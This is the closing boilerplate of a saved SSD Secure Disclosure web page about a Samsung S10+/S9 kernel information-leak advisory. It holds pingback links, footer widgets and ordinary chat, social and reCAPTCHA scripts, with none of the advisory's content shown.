				Pingback: <a href="https://malwareprotection.com/index.php/2021/08/25/ssd-secure-disclosure-advisory-find-out-how-a-vulnerability-discovered-in-samsung-s10-s9-kernel-allows-leaking-of-sensitive-function-address-informat" rel="external nofollow ugc" class="url">SSD Secure Disclosure Advisory: Find out how a vulnerability discovered in Samsung S10+/S9 kernel allows leaking of sensitive function address information. - Malware Protection</a> 			</div>
		</li><!-- #comment-## -->
		<li id="comment-1114" class="pingback odd alt thread-odd thread-alt depth-1">
			<div class="comment-body">
				Pingback: <a href="https://adware.ws/index.php/2021/08/25/ssd-secure-disclosure-advisory-find-out-how-a-vulnerability-discovered-in-samsung-s10-s9-kernel-allows-leaking-of-sensitive-function-address-information/malware-" rel="external nofollow ugc" class="url">SSD Secure Disclosure Advisory: Find out how a vulnerability discovered in Samsung S10+/S9 kernel allows leaking of sensitive function address information. - Adware.ws</a> 			</div>
		</li><!-- #comment-## -->
		<li id="comment-1115" class="pingback even thread-even depth-1">
			<div class="comment-body">
				Pingback: <a href="https://malwareforum.com/index.php/2021/08/25/ssd-secure-disclosure-advisory-find-out-how-a-vulnerability-discovered-in-samsung-s10-s9-kernel-allows-leaking-of-sensitive-function-address-information/m" rel="external nofollow ugc" class="url">SSD Secure Disclosure Advisory: Find out how a vulnerability discovered in Samsung S10+/S9 kernel allows leaking of sensitive function address information. - MalwareForum.com</a> 			</div>
		</li><!-- #comment-## -->
		<li id="comment-1124" class="pingback odd alt thread-odd thread-alt depth-1">
			<div class="comment-body">
				Pingback: <a href="https://aeternusmalus.wordpress.com/2021/08/28/ssd-advisory-samsung-s10-s9-kernel-4-14-android-10-kernel-function-address-text-and-heap-address-information-leak-ssd-secure-disclosure/" rel="external nofollow ugc" class="url">SSD Advisory – Samsung S10+/S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak – SSD Secure Disclosure – Library 9: Gladius Edition</a> 			</div>
		</li><!-- #comment-## -->
   </ul>
      
         <h5 class="no-comments">Comments are closed.</h5>
   
   </div>
      </div>
   </div>
      </div>

</div>
<footer id="footer" class="classic">
      

      <div class="lower-footer">
          <div class="container">
             <div class="pull-left">
               <span>SSD Secure Disclosure. All rights reserved.</span>
            </div>
            <div class="pull-right">
					  <div class="sfsi_widget sfsi_shortcode_container"><div id="sfsi_wDiv"></div><div class="norm_row sfsi_wDiv " style="width:225px;text-align:left;"><div style="width:40px; height:40px;margin-left:5px;margin-bottom:5px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="fade_in" target="_blank" href="https://www.facebook.com/ssdsecuredisclosure/" id="sfsiid_facebook_icon" style="opacity:0.6"><img data-pin-nopin="true" alt="Facebook" title="Facebook" width="40" height="40" style="" data-effect="fade_in" data-src="https://ssd-disclosure.com/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/thin/thin_facebook.png" class="sfcm sfsi_wicon  lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img data-pin-nopin='true' alt='Facebook' title='Facebook' src='https://ssd-disclosure.com/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/thin/thin_facebook.png' width='40' height='40' style='' class='sfcm sfsi_wicon ' data-effect='fade_in'   /></noscript></a></div></div><div style="width:40px; height:40px;margin-left:5px;margin-bottom:5px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="fade_in" target="_blank" href="https://twitter.com/securiteam_ssd" id="sfsiid_twitter_icon" style="opacity:0.6"><img data-pin-nopin="true" alt="Twitter" title="Twitter" width="40" height="40" style="" data-effect="fade_in" data-src="https://ssd-disclosure.com/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/thin/thin_twitter.png" class="sfcm sfsi_wicon  lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img data-pin-nopin='true' alt='Twitter' title='Twitter' src='https://ssd-disclosure.com/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/thin/thin_twitter.png' width='40' height='40' style='' class='sfcm sfsi_wicon ' data-effect='fade_in'   /></noscript></a></div></div><div style="width:40px; height:40px;margin-left:5px;margin-bottom:5px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="fade_in" target="_blank" href="https://www.linkedin.com/company/ssd-disclosure/" id="sfsiid_linkedin_icon" style="opacity:0.6"><img data-pin-nopin="true" alt="LinkedIn" title="LinkedIn" width="40" height="40" style="" data-effect="fade_in" data-src="https://ssd-disclosure.com/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/thin/thin_linkedin.png" class="sfcm sfsi_wicon  lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img data-pin-nopin='true' alt='LinkedIn' title='LinkedIn' src='https://ssd-disclosure.com/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/thin/thin_linkedin.png' width='40' height='40' style='' class='sfcm sfsi_wicon ' data-effect='fade_in'   /></noscript></a></div></div><div style="width:40px; height:40px;margin-left:5px;margin-bottom:5px; " class="sfsi_wicons shuffeldiv "><div class="inerCnt"><a class=" sficn" data-effect="fade_in" target="_blank" href="https://www.youtube.com/channel/UC9ZnYbYqOe6Y3eRdw0TMz9Q?view_as=subscriber" id="sfsiid_youtube_icon" style="opacity:0.6"><img data-pin-nopin="true" alt="YouTube" title="YouTube" width="40" height="40" style="" data-effect="fade_in" data-src="https://ssd-disclosure.com/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/thin/thin_youtube.png" class="sfcm sfsi_wicon  lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img data-pin-nopin='true' alt='YouTube' title='YouTube' src='https://ssd-disclosure.com/wp-content/plugins/ultimate-social-media-icons/images/icons_theme/thin/thin_youtube.png' width='40' height='40' style='' class='sfcm sfsi_wicon ' data-effect='fade_in'   /></noscript></a></div></div></div><div id="sfsi_holder" class="sfsi_holders" style="position: relative; float: left; width: 100%; z-index: -1; height: 66px;"></div><script>window.addEventListener("sfsi_functions_loaded", function() 
			{
				if (typeof sfsi_widget_set == "function") {
					sfsi_widget_set();
				}
			}); </script><div style="clear: both;"></div></div>                           </div>
         </div>
      </div>
</footer>


                <script data-cfasync="false">
  document.onreadystatechange = function () {
    if (document.readyState == "complete") {
      var logout_link = document.querySelectorAll('a[href*="wp-login.php?action=logout"]');
      if (logout_link) {
        for(var i=0; i < logout_link.length; i++) {
          logout_link[i].addEventListener( "click", function() {
            Intercom('shutdown');
          });
        }
      }
    }
  };
</script>
<script data-cfasync="false">
  window.intercomSettings = {"app_id":"bhw7ka8q"};
</script>
<script data-cfasync="false">(function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/bhw7ka8q';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s, x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})()</script>			<!--facebook like and share js -->
			<div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div></div>
			<script>
				(function(d, s, id) {
					var js, fjs = d.getElementsByTagName(s)[0];
					if (d.getElementById(id)) return;
					js = d.createElement(s);
					js.id = id;
					js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.5";
					fjs.parentNode.insertBefore(js, fjs);
				}(document, 'script', 'facebook-jssdk'));
			</script>
		<script>
window.addEventListener('sfsi_functions_loaded', function() {
    if (typeof sfsi_responsive_toggle == 'function') {
        sfsi_responsive_toggle(0);
        // console.log('sfsi_responsive_toggle');

    }
})
</script>
    <script>
        window.addEventListener('sfsi_functions_loaded', function() {
            if (typeof sfsi_plugin_version == 'function') {
                sfsi_plugin_version(2.68);
            }
        });

        function sfsi_processfurther(ref) {
            var feed_id = 'dzh5eFRIdGRSV1N0SXZ5QmpBa0VnV21ZZTNpbElPdFp2US9ldXF4ekdPeU1yVjZvOE5PNlArc2RZVjhScllqcUlkSTh0MjZuODM0bDRoUmJXdW16MzJMbHppd3lXSUJxT3d6TzdqQjJDQnlEeU1ZcUc0cWtpNnRhempJcEt2M2Z8Uy9tSFBnTk1OQTBMZGdGWHZiZEIxUnFTNkhodmR6YnNaVFVtRWdFQzZYVT0=';
            var feedtype = 8;
            var email = jQuery(ref).find('input[name="email"]').val();
            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
            if ((email != "Enter your email") && (filter.test(email))) {
                if (feedtype == "8") {
                    var url = "https://api.follow.it/subscription-form/" + feed_id + "/" + feedtype;
                    window.open(url, "popupwindow", "scrollbars=yes,width=1080,height=760");
                    return true;
                }
            } else {
                alert("Please enter email address");
                jQuery(ref).find('input[name="email"]').focus();
                return false;
            }
        }
    </script>
    <style type="text/css" aria-selected="true">
        .sfsi_subscribe_Popinner {
            width: 100% !important;

            height: auto !important;

            padding: 18px 0px !important;

            background-color: #ffffff !important;
        }
        .sfsi_subscribe_Popinner form {
            margin: 0 20px !important;
        }
        .sfsi_subscribe_Popinner h5 {
            font-family: Helvetica,Arial,sans-serif !important;

            font-weight: bold !important;

            color: #000000 !important;

            font-size: 16px !important;

            text-align: center !important;
            margin: 0 0 10px !important;
            padding: 0 !important;
        }
        .sfsi_subscription_form_field {
            margin: 5px 0 !important;
            width: 100% !important;
            display: inline-flex;
            display: -webkit-inline-flex;
        }

        .sfsi_subscription_form_field input {
            width: 100% !important;
            padding: 10px 0px !important;
        }

        .sfsi_subscribe_Popinner input[type=email] {
            font-family: Helvetica,Arial,sans-serif !important;

            font-style: normal !important;

            color:  !important;

            font-size: 14px !important;

            text-align: center !important;
        }

        .sfsi_subscribe_Popinner input[type=email]::-webkit-input-placeholder {

            font-family: Helvetica,Arial,sans-serif !important;

            font-style: normal !important;

            color:  !important;

            font-size: 14px !important;

            text-align: center !important;
        }
        .sfsi_subscribe_Popinner input[type=email]:-moz-placeholder {
            /* Firefox 18- */

            font-family: Helvetica,Arial,sans-serif !important;

            font-style: normal !important;

            color:  !important;

            font-size: 14px !important;

            text-align: center !important;

        }

        .sfsi_subscribe_Popinner input[type=email]::-moz-placeholder {
            /* Firefox 19+ */
            font-family: Helvetica,Arial,sans-serif !important;

            font-style: normal !important;

            color:  !important;

            font-size: 14px !important;

            text-align: center !important;

        }

        .sfsi_subscribe_Popinner input[type=email]:-ms-input-placeholder {
            font-family: Helvetica,Arial,sans-serif !important;

            font-style: normal !important;

            color:  !important;

            font-size: 14px !important;

            text-align: center !important;
        }

        .sfsi_subscribe_Popinner input[type=submit] {
            font-family: Helvetica,Arial,sans-serif !important;

            font-weight: bold !important;

            color: #000000 !important;

            font-size: 16px !important;

            text-align: center !important;

            background-color: #dedede !important;
        }

        .sfsi_shortcode_container {
            float: left;
        }

        .sfsi_shortcode_container .norm_row .sfsi_wDiv {
            position: relative !important;
        }

        .sfsi_shortcode_container .sfsi_holders {
            display: none;
        }

            </style>

<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
        <div class="pswp__bg"></div>
        <div class="pswp__scroll-wrap">
            <div class="pswp__container">
                <div class="pswp__item"></div>
                <div class="pswp__item"></div>
                <div class="pswp__item"></div>
            </div>
            <div class="pswp__ui pswp__ui--hidden">
                <div class="pswp__top-bar">
                    <div class="pswp__counter"></div>
                    <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                    <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                    <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                    <div class="pswp__preloader">
                        <div class="pswp__preloader__icn">
                          <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                          </div>
                        </div>
                    </div>
                </div>
                <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
                </button>
                <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
                </button>
                <div class="pswp__caption">
                    <div class="pswp__caption__center"></div>
                </div>
            </div>
        </div>
    </div><script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/regenerator-runtime.min.js.下載" id="regenerator-runtime-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/wp-polyfill.min.js.下載" id="wp-polyfill-js"></script>
<script type="text/javascript" id="contact-form-7-js-extra">
/* <![CDATA[ */
var wpcf7 = {"api":{"root":"https:\/\/ssd-disclosure.com\/wp-json\/","namespace":"contact-form-7\/v1"},"cached":"1"};
/* ]]> */
</script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/index.js.下載" id="contact-form-7-js"></script>
<script type="text/javascript" id="pt-cv-content-views-script-js-extra">
/* <![CDATA[ */
var PT_CV_PUBLIC = {"_prefix":"pt-cv-","page_to_show":"5","_nonce":"b387df4d15","is_admin":"","is_mobile":"","ajaxurl":"https:\/\/ssd-disclosure.com\/wp-admin\/admin-ajax.php","lang":"","loading_image_src":"data:image\/gif;base64,R0lGODlhDwAPALMPAMrKygwMDJOTkz09PZWVla+vr3p6euTk5M7OzuXl5TMzMwAAAJmZmWZmZszMzP\/\/\/yH\/C05FVFNDQVBFMi4wAwEAAAAh+QQFCgAPACwAAAAADwAPAAAEQvDJaZaZOIcV8iQK8VRX4iTYoAwZ4iCYoAjZ4RxejhVNoT+mRGP4cyF4Pp0N98sBGIBMEMOotl6YZ3S61Bmbkm4mAgAh+QQFCgAPACwAAAAADQANAAAENPDJSRSZeA418itN8QiK8BiLITVsFiyBBIoYqnoewAD4xPw9iY4XLGYSjkQR4UAUD45DLwIAIfkEBQoADwAsAAAAAA8ACQAABC\/wyVlamTi3nSdgwFNdhEJgTJoNyoB9ISYoQmdjiZPcj7EYCAeCF1gEDo4Dz2eIAAAh+QQFCgAPACwCAAAADQANAAAEM\/DJBxiYeLKdX3IJZT1FU0iIg2RNKx3OkZVnZ98ToRD4MyiDnkAh6BkNC0MvsAj0kMpHBAAh+QQFCgAPACwGAAAACQAPAAAEMDC59KpFDll73HkAA2wVY5KgiK5b0RRoI6MuzG6EQqCDMlSGheEhUAgqgUUAFRySIgAh+QQFCgAPACwCAAIADQANAAAEM\/DJKZNLND\/kkKaHc3xk+QAMYDKsiaqmZCxGVjSFFCxB1vwy2oOgIDxuucxAMTAJFAJNBAAh+QQFCgAPACwAAAYADwAJAAAEMNAs86q1yaWwwv2Ig0jUZx3OYa4XoRAfwADXoAwfo1+CIjyFRuEho60aSNYlOPxEAAAh+QQFCgAPACwAAAIADQANAAAENPA9s4y8+IUVcqaWJ4qEQozSoAzoIyhCK2NFU2SJk0hNnyEOhKR2AzAAj4Pj4GE4W0bkJQIAOw=="};
var PT_CV_PAGINATION = {"first":"\u00ab","prev":"\u2039","next":"\u203a","last":"\u00bb","goto_first":"Go to first page","goto_prev":"Go to previous page","goto_next":"Go to next page","goto_last":"Go to last page","current_page":"Current page is","goto_page":"Go to page"};
/* ]]> */
</script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/cv.js.下載" id="pt-cv-content-views-script-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/core.min.js.下載" id="jquery-ui-core-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/modernizr.custom.min.js.下載" id="SFSIjqueryModernizr-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/jquery.shuffle.min.js.下載" id="SFSIjqueryShuffle-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/random-shuffle-min.js.下載" id="SFSIjqueryrandom-shuffle-js"></script>
<script type="text/javascript" id="SFSICustomJs-js-extra">
/* <![CDATA[ */
var sfsi_icon_ajax_object = {"ajax_url":"https:\/\/ssd-disclosure.com\/wp-admin\/admin-ajax.php","plugin_url":"https:\/\/ssd-disclosure.com\/wp-content\/plugins\/ultimate-social-media-icons\/"};
/* ]]> */
</script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/custom.js.下載" id="SFSICustomJs-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/bootstrap.min.js.下載" id="bootstrapjs-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/SmoothScroll.js.下載" id="keydesign-smooth-scroll-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/scripts.js.下載" id="keydesign-scripts-js"></script>
<script type="text/javascript" id="keydesign-scripts-js-after">
window.intercomSettings = {
    app_id: "ny9welpf"
  };
</script>

<script>
// We pre-filled your app ID in the widget URL: 'https://widget.intercom.io/widget/ny9welpf'
(function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/ny9welpf';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/api.js.下載" id="google-recaptcha-js"></script>
<script type="text/javascript" id="wpcf7-recaptcha-js-extra">
/* <![CDATA[ */
var wpcf7_recaptcha = {"sitekey":"6LdKdeQUAAAAAGNZ2wKZL9ExIds5IBTw-Phsxa9T","actions":{"homepage":"homepage","contactform":"contactform"}};
/* ]]> */
</script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/index.js(1).下載" id="wpcf7-recaptcha-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/enlighterjs.min.js.下載" id="enlighterjs-js"></script>
<script type="text/javascript" id="enlighterjs-js-after">
!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":true,"theme":"enlighter","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
</script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/smush-lazy-load.min.js.下載" id="smush-lazy-load-js"></script>
<script type="text/javascript" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/wp-embed.min.js.下載" id="wp-embed-js"></script>


<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/anchor.html" width="256" height="60" role="presentation" name="a-itdm3px2czk6" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/saved_resource(1).html"></iframe></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/saved_resource(2).html"></iframe><div id="intercom-container" class="intercom-namespace"><style>html.intercom-mobile-messenger-active,html.intercom-mobile-messenger-active > body,html.intercom-modal-open,#intercom-container-body{overflow:hidden !important;}html.intercom-mobile-messenger-active,html.intercom-mobile-messenger-active > body{position:static !important;}html.intercom-mobile-messenger-active > body{height:0 !important;margin:0 !important;}html.intercom-mobile-messenger-active.intercom-mobile-messenger-ios-15 > body{height:100vh !important;}iframe#intercom-frame{position:absolute !important;opacity:0 !important;width:1px !important;height:1px !important;top:0 !important;left:0 !important;border:none !important;display:block !important;z-index:-1 !important;}</style><div class="intercom-app" aria-live="polite"><iframe allowfullscreen="" class="intercom-k70bnj e1gfsz3r0" name="intercom-notifications-frame" title="Intercom live chat message" data-intercom-frame="true" role="modal" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/saved_resource(3).html"></iframe><iframe allowfullscreen="" class="intercom-launcher-frame intercom-3bhwaw e1ur5zlj0" name="intercom-launcher-frame" title="Intercom live chat" data-intercom-frame="true" role="modal" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/saved_resource(4).html"></iframe><iframe allowfullscreen="" class="intercom-launcher-badge-frame intercom-s06fua e1loc0kc0" name="intercom-launcher-badge-frame" title="Intercom live chat notification" data-intercom-frame="true" role="modal" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/saved_resource(5).html"></iframe><div style="opacity: 1;"><div class="intercom-ytk0w4 e1cisntp0"></div></div><div id="intercom-modal-container"></div></div></div><div id="intercom-css-container"><style data-emotion="intercom-global"></style><style data-emotion="intercom"></style></div></body></html>